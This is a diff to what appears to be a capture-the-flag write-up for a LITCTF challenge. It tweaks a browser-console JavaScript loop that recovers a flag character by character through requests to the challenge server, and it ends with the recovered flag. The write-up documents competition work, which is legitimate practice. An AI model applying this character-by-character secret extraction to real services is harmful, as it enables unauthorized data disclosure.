@@ -25,7 +25,7 @@ await fetch("http://litctf.live:31770/", {
 
 Then, we just do some templating and map each possible character to a request:
 ```js
-await (async () => {
+await (async () => { // IIFE (to use await) not necessary on Chrome
     const chars = [..."}abcdefghijklmnopqrstuvwxyz"];
     let flag = "LITCTF{";
     while (true) {
@@ -49,7 +49,7 @@ await (async () => {
         if (next[0] == "}") break;
     }
     return flag;
-})();
+})()
 // LITCTF{sldjf}
 ```
 (This is run in the console on the same page, to avoid CORS issues.)
